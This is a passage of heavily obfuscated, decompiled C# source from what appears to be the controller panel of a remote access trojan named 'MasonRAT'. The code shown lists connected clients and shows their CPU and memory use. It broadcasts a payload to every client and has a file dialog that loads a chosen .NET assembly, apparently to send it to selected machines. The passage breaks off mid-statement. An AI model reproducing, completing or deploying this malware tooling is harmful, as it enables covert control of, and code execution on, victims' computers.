      object[] objArray = new object[(-1042976520 - 1860737350 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ (1940281915 - 549028487 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) % (-952644348 - 1566032441 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)];
      int count = this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Items.Count;
      objArray[0] = (object) count.ToString();
      count = this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count;
      objArray[1] = (object) count.ToString();
      objArray[(257083832 > 1803480883 ? -569418428 : -427063821) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 - ~(800633308 - 1272999430 % 449714972 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1] = (object) Settings.\u2694️MasonRAT\u270Cڼ\u060D\u060Fـ̍ڙٺـ\u0609ۏﻋـ\u060Fـ\u060D;
      objArray[((889082102 > 300366428 ? -8 : -10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + ((113305802 - -650322869 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) >> (1130270667 - 660555185 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = (object) Settings.\u2694️MasonRAT\u270C\u060B\u0608ـدبـ\u060Bــحم̍ٽـ\u0609ڙـڟ;
      objArray[((2040525544 ^ (2015335092 | 1098937066)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 1603508356 - 1603508338 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)] = (object) Helper.\u2694️MasonRAT\u270Cــٺــ\u0608ـ\u060Dٺ̍ڙـاۚ\u0609ژڝ(Settings.\u2694️MasonRAT\u270Cۭ̍\u060F\u0609ـــْؤۙڙۧـــ\u060Cۙح);
      objArray[((2039702011 >> 1321049794) - 8851204 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ (1690999198 - 1529663519 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 | 1729546175 % 2084402017 - 1380533912 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0] = (object) Helper.\u2694️MasonRAT\u270Cــٺــ\u0608ـ\u060Dٺ̍ڙـاۚ\u0609ژڝ(Settings.\u2694️MasonRAT\u270C\u060Cۡدٻ̍ـ\u060Bـڇداڠى\u060Eـگـ\u0608);
      strArray1[0] = string.Format(format, objArray);
      strArray1[1] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1493);
      strArray1[(975493935 - 309089251 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + ~(712158020 - 45753339 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)] = Conversions.ToString(checked ((int) Math.Round((double) this.\u2694️MasonRAT\u270Cــۧڅﮪ\u060D\u0609ـــ\u0608.NextValue())));
      strArray1[-413533512 - 1459058995 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + ((-179135134 ^ ~1127310571) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 | (610654638 ^ 48277478 % 1307043595) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1494);
      strArray1[(1397072879 + 2116736776 % 1376889972 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - ((185768506 > 1277827446 ? 1192410486 : 894307865) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 | 1138354696 + (1951262446 >> 631389284) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = Conversions.ToString(checked ((int) Math.Round((double) this.\u2694️MasonRAT\u270Cڕـۙۏ\u060Aژـﮪ\u0608ـ\u060Dڛــٻ\u060Cڝـ.NextValue())));
      strArray1[(-1952050 ^ 22) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + (1637136087 - 637688770 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 >> (1346980407 + 766233202 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1495);
      string str = string.Concat(strArray1);
      stripStatusLabel.Text = str;
      string[] strArray2 = new string[327523922 % 967451124 - 1588635420 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + (1640810377 - 379698872 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) % ((-815364940 ^ ~1645000005) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1)];
      strArray2[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1496);
      strArray2[1] = DateTime.Now.ToLongTimeString();
      strArray2[((1820293482 >> 634733283) - 1104864299 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - -(1234039754 - 356712138 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1497);
      strArray2[((67403319 ^ (1516313818 | 1765643825)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ ((1710132904 ^ (42411623 | 975662596)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 | (75256077 << 504892095) - 1418092404 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = Conversions.ToString(checked ((int) Math.Round((double) this.\u2694️MasonRAT\u270Cــۧڅﮪ\u060D\u0609ـــ\u0608.NextValue())));
      strArray2[((1135928427 ^ ~1210861495) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - ~(816614903 + -622062103 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1498);
      strArray2[((1506909737 > 649948628 ? 1229986226 : 1639981634) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 > 999331971 + (1341744842 << 279196440) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ? (-2147483643 /*0x80000005*/ ^ 293988736 << 1828920440) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 : 1111023775 + -1111023769 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0] = Conversions.ToString(checked ((int) Math.Round((double) this.\u2694️MasonRAT\u270Cڕـۙۏ\u060Aژـﮪ\u0608ـ\u060Dڛــٻ\u060Cڝـ.NextValue())));
      strArray2[-1078105381 - 331180757 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + ((889891021 > 1521619045 ? 267136454 : 200352341) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << (2142225181 ^ (1894810337 | 1954023111)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1499);
      this.Text = string.Concat(strArray2);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Aـ\u060Dـة\u060Dحــۧـ\u060D(object sender, EventArgs e)
  {
    if (Settings.\u2694️MasonRAT\u270Cڙټ\u060Bـ\u0609ڙٸـ\u060Cــۙـ\u060Dـ\u0609ـ\u060Aٽ\u060A.Count > 0)
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1500));
      try
      {
        foreach (Client C_ in Settings.\u2694️MasonRAT\u270Cڙټ\u060Bـ\u0609ڙٸـ\u060Cــۙـ\u060Dـ\u0609ـ\u060Aٽ\u060A.ToList<Client>())
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests(C_, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        List<Client>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }
    GC.Collect();
  }

  private void \u2694️MasonRAT\u270Cطۏڞﻻـ\u0609\u060Aۡ\u060Dگ\u060Bـ(
    object sender,
    CancelEventArgs e)
  {
    try
    {
      this.\u2694️MasonRAT\u270C\u060Dﻻٺدئـڕٺڞ\u060Bٸ̍ﮪ\u0609?.Dispose();
      Environment.Exit(0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Aــــ\u060Bـژ\u060A\u0609ــ\u060D\u060F\u0609ڙ\u060Bـڟ\u0608(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cمۧڙ\u0609̍ـ\u0020ــڙ\u060D\u060Aـژـۡ\u060D(
    object sender,
    MouseEventArgs e)
  {
    try
    {
      ListViewHitTestInfo listViewHitTestInfo = this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.HitTest(e.Location);
      if (e.Button != (MouseButtons) (-1719886 - (22919013 >> 1885687068) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + (1167140652 + 250312075 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 >> (1194951049 - (1343889288 << 413833798) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)) || listViewHitTestInfo.Item == null && listViewHitTestInfo.SubItem == null)
        return;
      this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Items[listViewHitTestInfo.Item.Index].Selected = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cــــۛ\u060C\u0608ـ\u0608\u060Aـ؁\u060Dٽڝٽــ(
    object sender,
    KeyEventArgs e)
  {
    try
    {
      if (e.Modifiers != (Keys) (((-652671831 ^ 3) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + ((-290498896 ^ -857248074) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 | 648461517 + (1188094873 >> 1755236525) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)) || e.KeyCode != (Keys) ((1622715296 > 677116863 ? 982312810 : 1309750413) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 - (-1420469808 - 1892184743 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) % (-1344414758 - 1729135237 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)))
        return;
      if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Items.Count > 0)
      {
        try
        {
          foreach (ListViewItem listViewItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Items)
            listViewItem.Selected = true;
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u0608ـڼ\u060Fـ̍ڙـ\u0609ــــ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060Fٸ\u060E\u060Eټ\u060Aٻـۡ̍ـۡ\u060D\u0608ټۡ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count > 0)
    {
      try
      {
        OpenFileDialog openFileDialog1 = new OpenFileDialog();
        OpenFileDialog openFileDialog2 = openFileDialog1;
        openFileDialog2.Filter = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1501);
        openFileDialog2.Title = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1502);
        if (openFileDialog1.ShowDialog() == DialogResult.OK)
        {
          try
          {
            Assembly.LoadFile(openFileDialog1.FileName).EntryPoint.GetParameters();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            int num = (int) MessageBox.Show(openFileDialog1.FileName, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1503));
            ProjectData.ClearProjectError();
            return;
          }
          string[] strArray = new string[((1381057185 | 2037327634) - 1783861050 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 > 1297773852 - 1421607201 % 1011246050 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ? 109453756 - 109453750 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 : 1026807770 + -1026807765 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + 